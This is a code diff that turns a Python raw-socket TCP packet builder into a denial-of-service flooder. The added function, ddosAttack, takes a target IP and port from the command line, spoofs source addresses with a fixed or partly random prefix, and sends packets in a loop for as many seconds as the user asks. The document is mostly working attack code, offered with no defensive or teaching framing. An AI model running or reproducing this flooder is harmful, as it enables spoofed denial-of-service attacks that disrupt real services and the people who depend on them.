@@ -2,10 +2,13 @@ import socket, sys, time
 from struct import *
 from random import randint
 import random
+import sys
+import getopt
 
 
 class TCP_packet:
-    def __init__(self, source_ip = '127.0.0.1', dest_ip = '192.168.43.96', source_port = 80, dest_port = 3000):
+    #def __init__(self, source_ip = '127.0.0.1', dest_ip = '192.168.43.96', source_port = 80, dest_port = 3000):
+    def __init__(self, dest_ip, dest_port, source_ip = '127.0.0.1',source_port = 80):
         self.source_ip = source_ip
         self.dest_ip = dest_ip
         self.source_port = source_port
@@ -110,12 +113,18 @@ class TCP_packet:
         self.packet = ip_header + tcp_header
         return
 
+
     '''
     generating random ip & port# and make packet with it.
     '''
-    def random_source(self):
+    def random_source(self, first, second, third, fourth):
+        first = genRadomIp(first)
+        second = genRadomIp(second)
+        third = genRadomIp(third)
+        fourth = genRadomIp(fourth)
+
         bits = random.getrandbits(32)
-        self.source_ip = str(randint(0,255)) + '.' + str(randint(0,255)) + '.' + str(randint(0,255)) + '.' + str(randint(0,255)) #make random IPv4 address
+        self.source_ip = first + '.' + second + '.' + third + '.' + fourth #make random IPv4 address
         self.source_port = randint(0,9999) #make random port number
         self.makePacket()
         return
@@ -123,8 +132,15 @@ class TCP_packet:
     def send_socket(self):
         self.socket.sendto(self.packet, (self.dest_ip, self.dest_port)) #sending packet to dest_ip & port
 
-if __name__ == "__main__":
-    tcp = TCP_packet()
+def genRadomIp(ip):
+    if ip == -1:
+        ip = str(randint(0,255))
+    else:
+        ip = str(ip)
+    return ip
+
+def ddosAttack():
+    tcp = TCP_packet(dest_ip=sys.argv[2], dest_port= int(sys.argv[3]))
     end = input('How much seconds do you want?')
     start = time.time()
     end = start + float(end)
@@ -135,8 +151,14 @@ if __name__ == "__main__":
     while True:
         if time.time() > end:
             break
-        tcp.random_source()
+        if sys.argv[1] == '-r':
+            tcp.random_source(169, 234, 2, -1)
+        else :
+            tcp.random_source(169, 234, 2, 161)
         tcp.send_socket()
         count += 1
-
     print(str(count) + " packets are sent")
+
+
+if __name__ == "__main__":
+    ddosAttack()
